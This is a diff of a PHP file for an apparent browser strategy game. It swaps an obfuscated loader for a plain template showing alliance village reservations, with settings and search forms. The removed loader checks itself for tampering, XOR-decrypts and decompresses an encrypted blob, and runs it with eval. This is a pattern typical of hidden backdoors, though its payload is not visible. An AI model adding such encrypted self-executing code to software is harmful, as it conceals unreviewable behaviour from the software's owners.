@@ -1,24 +1,257 @@
-<?php
-$gcgmdd="d4e9f64469135ead2109cfddf3da7081";
-$nodcknp="5d0d015805015605005c030a570453560402510d060255055552505802040a54";
-$wmhsgfv="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";
-$ansmnkw=file_get_contents(__FILE__);
-$ycjsftdhh=str_replace($wmhsgfv,"",$ansmnkw);
-if(strpos($ycjsftdhh,"ec"."ho")!==false||strpos($ycjsftdhh,"pr"."int")!==false||strpos($ycjsftdhh,"var_"."dump")!==false||strpos($ycjsftdhh,"file_put_"."contents")!==false||strpos($ycjsftdhh,"fw"."rite")!==false){die();}
-$vijoydhc=str_replace(array($gcgmdd,$nodcknp),array("SP_0d895db2","KP_ff75d638"),$ansmnkw);
-$ypobkuejd=md5($vijoydhc);
-$rvjswmbbf=hex2bin($nodcknp);
-$kdbumjnjk="";
-$tcbmugkq=strlen($ypobkuejd);
-for($mekbaohbi=0;$mekbaohbi<$tcbmugkq;$mekbaohbi++){
-$kdbumjnjk.=chr(ord($rvjswmbbf[$mekbaohbi])^ord($ypobkuejd[$mekbaohbi]));
-}
-$choloq=base64_decode($wmhsgfv);
-$fzjmkrg=strlen($choloq);
-$ozeicokv="";
-$khhstyfw=strlen($kdbumjnjk);
-for($mekbaohbi=0;$mekbaohbi<$fzjmkrg;$mekbaohbi++){
-$ozeicokv.=$choloq[$mekbaohbi]^$kdbumjnjk[$mekbaohbi%$khhstyfw];
-}
-$pvsaxdk="gzun"."compress";
-eval('?>' . $pvsaxdk($ozeicokv) . '<?php ');
+<?php if ($res_disabled ?? false): ?>
+
+    <!-- System disabled -->
+    <p><?= __('screens.ally.res_disabled_msg') ?></p>
+    <?php if ($is_leader): ?>
+        <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=enable&h=<?= $session['hkey'] ?>"
+            class="btn">
+            <?= __('screens.ally.res_enable') ?>
+        </a>
+    <?php endif; ?>
+
+<?php elseif ($config_mode ?? false): ?>
+
+    <!-- Edit Config (leader only) -->
+    <h3><?= __('screens.ally.res_config_title') ?></h3>
+    <form
+        action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=config&h=<?= $session['hkey'] ?>"
+        method="post">
+        <table class="vis" width="100%">
+            <tr>
+                <th colspan="2"><?= __('screens.ally.res_config_title') ?></th>
+            </tr>
+            <tr>
+                <td><?= __('screens.ally.res_config_max') ?></td>
+                <td><input type="number" name="max_reservations" min="1" max="50"
+                        value="<?= (int) ($config['max_reservations'] ?? 5) ?>"></td>
+            </tr>
+            <tr>
+                <td><?= __('screens.ally.res_config_days') ?></td>
+                <td><input type="number" name="max_days" min="1" max="30" value="<?= (int) ($config['max_days'] ?? 3) ?>">
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2" align="center">
+                    <input type="submit" value="<?= __('screens.ally.res_config_save') ?>" class="btn">
+                </td>
+            </tr>
+        </table>
+    </form>
+
+<?php elseif ($partners_mode ?? false): ?>
+
+    <!-- Partners (placeholder) -->
+    <h3><?= __('screens.ally.res_partners_title') ?></h3>
+    <table class="vis" width="100%">
+        <tr>
+            <th><?= __('screens.ally.res_partners_title') ?></th>
+        </tr>
+        <tr>
+            <td align="center"><i><?= __('screens.ally.res_partners_info') ?></i></td>
+        </tr>
+    </table>
+    <br>
+    <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations">&laquo;
+        <?= __('screens.ally.res_show_log') ?></a>
+
+<?php else: ?>
+
+    <p><?= __('screens.ally.res_intro') ?></p>
+
+    <form action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&h=<?= $session['hkey'] ?>"
+        method="post" id="reservations_form">
+        <table class="vis" width="100%">
+            <tr>
+                <th width="20"><input type="checkbox" id="select_all_res" onclick="toggleAllReservations(this)"></th>
+                <th><?= __('screens.ally.res_village_name') ?></th>
+                <th><?= __('screens.ally.res_points') ?></th>
+                <th><?= __('screens.ally.res_owner') ?></th>
+                <th><?= __('screens.ally.res_reserved_by') ?></th>
+                <th><?= __('screens.ally.res_expires') ?></th>
+                <th width="60"><?= __('screens.ally.res_actions') ?></th>
+            </tr>
+            <?php if (empty($reservations)): ?>
+                <tr>
+                    <td colspan="7" align="center"><i><?= __('screens.ally.res_no_reservations') ?></i></td>
+                </tr>
+            <?php else: ?>
+                <?php foreach ($reservations as $res): ?>
+                    <tr>
+                        <td align="center">
+                            <input type="checkbox" name="res[]" value="<?= $res['id'] ?>">
+                        </td>
+                        <td>
+                            <a href="game.php?village=<?= $village['id'] ?>&screen=info_village&id=<?= $res['village_id'] ?>">
+                                <?= htmlspecialchars($res['village_name']) ?>
+                            </a>
+                        </td>
+                        <td align="center"><?= number_format($res['points']) ?></td>
+                        <td><?= htmlspecialchars($res['owner_name'] ?? __('screens.ally.res_barbarian')) ?></td>
+                        <td><?= htmlspecialchars($res['reserved_by']) ?></td>
+                        <td align="center"><?= date('d.m.Y H:i', $res['expires_at']) ?></td>
+                        <td align="center">
+                            <?php if ($res['user_id'] == $user['id'] || $is_leader): ?>
+                                <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=delete&id=<?= $res['id'] ?>&h=<?= $session['hkey'] ?>"
+                                    onclick="return confirm('<?= __('screens.ally.res_cancel_confirm') ?>');">
+                                    <img src="/graphic/icons/delete.png" alt="X" title="<?= __('screens.ally.res_cancel_title') ?>"
+                                        style="width: 12px;">
+                                </a>
+                            <?php endif; ?>
+                        </td>
+                    </tr>
+                <?php endforeach; ?>
+            <?php endif; ?>
+        </table>
+
+        <div style="margin-top: 5px;">
+            <input type="submit" name="delete_selected" value="<?= __('screens.ally.res_delete_selected') ?>" class="btn">
+            <input type="submit" name="export_selected" value="<?= __('screens.ally.res_export_selected') ?>" class="btn">
+        </div>
+    </form>
+
+    <script>
+        function toggleAllReservations(checkbox) {
+            const checkboxes = document.querySelectorAll('input[name="res[]"]');
+            checkboxes.forEach(cb => cb.checked = checkbox.checked);
+        }
+    </script>
+
+    <br>
+
+    <a href="javascript:void(0);" onclick="document.getElementById('reservation_log').style.display='block';">&raquo;
+        <?= __('screens.ally.res_show_log') ?></a>
+
+    <div id="reservation_log" style="display:none;">
+        <br>
+        <table class="vis" width="100%">
+            <tr>
+                <th><?= __('screens.ally.res_log_date') ?></th>
+                <th><?= __('screens.ally.res_log_event') ?></th>
+            </tr>
+            <tr>
+                <td colspan="2" align="center"><i><?= __('screens.ally.res_no_events') ?></i></td>
+            </tr>
+        </table>
+    </div>
+
+    <br>
+
+    <table width="100%">
+        <tr>
+            <td valign="top" width="50%">
+                <!-- Add new reservation -->
+                <form
+                    action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=reserve&h=<?= $session['hkey'] ?>"
+                    method="post">
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th colspan="2"><?= __('screens.ally.res_add_new') ?></th>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <input type="radio" name="search_type" value="coords" id="coords" checked>
+                                <label for="coords"><?= __('screens.ally.res_search_coords') ?></label>
+
+                                <input type="radio" name="search_type" value="village" id="village_name">
+                                <label for="village_name"><?= __('screens.ally.res_search_village') ?></label>
+
+                                <input type="radio" name="search_type" value="player" id="player_name">
+                                <label for="player_name"><?= __('screens.ally.res_search_player') ?></label>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <input type="text" name="search_value" size="30" placeholder="123456" required>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" align="center">
+                                <input type="submit" value="<?= __('screens.ally.res_reserve_btn') ?>" class="btn">
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+            </td>
+
+            <td valign="top" width="50%" style="padding-left: 10px;">
+                <!-- Search reservations -->
+                <form action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=search"
+                    method="post">
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th colspan="2"><?= __('screens.ally.res_search_title') ?></th>
+                        </tr>
+                        <tr>
+                            <td>
+                                <input type="text" name="search" size="20">
+                                <select name="search_field">
+                                    <option value="name"><?= __('screens.ally.res_search_by_name') ?></option>
+                                    <option value="player"><?= __('screens.ally.res_search_by_player') ?></option>
+                                    <option value="reserved_by"><?= __('screens.ally.res_search_by_reserver') ?></option>
+                                </select>
+                            </td>
+                            <td width="100">
+                                <input type="submit" value="<?= __('screens.ally.res_search_btn') ?>" class="btn">
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+
+                <br>
+
+                <!-- Settings -->
+                <table class="vis" width="100%">
+                    <tr>
+                        <th><?= __('screens.ally.res_settings') ?></th>
+                    </tr>
+                    <tr>
+                        <td>
+                            <b><?= __('screens.ally.res_limit') ?>:</b> <?= $config['max_reservations'] ?? 5 ?>
+                            <?= __('screens.ally.res_villages') ?><br>
+                            <b><?= __('screens.ally.res_time_limit') ?>:</b> <?= $config['max_days'] ?? 3 ?>
+                            <?= __('screens.ally.res_days') ?><br>
+                            <b><?= __('screens.ally.res_wait_time') ?>:</b> <?= $config['wait_days'] ?? 3 ?>
+                            <?= __('screens.ally.res_days') ?>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td align="center">
+                            <?php if ($is_leader): ?>
+                                <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=config">&raquo;
+                                    <?= __('screens.ally.res_edit_settings') ?></a>
+                            <?php endif; ?>
+                        </td>
+                    </tr>
+                </table>
+
+                <br>
+
+                <!-- Shared reservation system -->
+                <table class="vis" width="100%">
+                    <tr>
+                        <th><?= __('screens.ally.res_shared_with') ?></th>
+                    </tr>
+                    <tr>
+                        <td align="center">
+                            <i><?= __('screens.ally.res_none') ?></i>
+                            <?php if ($is_leader): ?>
+                                <br><br>
+                                <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=partners">&raquo;
+                                    <?= __('screens.ally.res_edit_partners') ?></a>
+                            <?php endif; ?>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <?php if ($is_leader): ?>
+        <br>
+        <a href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=reservations&action=disable&h=<?= $session['hkey'] ?>"
+            onclick="return confirm('<?= __('screens.ally.res_disable_confirm') ?>');">
+            &raquo; <?= __('screens.ally.res_disable') ?>
+        </a>
+    <?php endif; ?>
+
+<?php endif; ?>
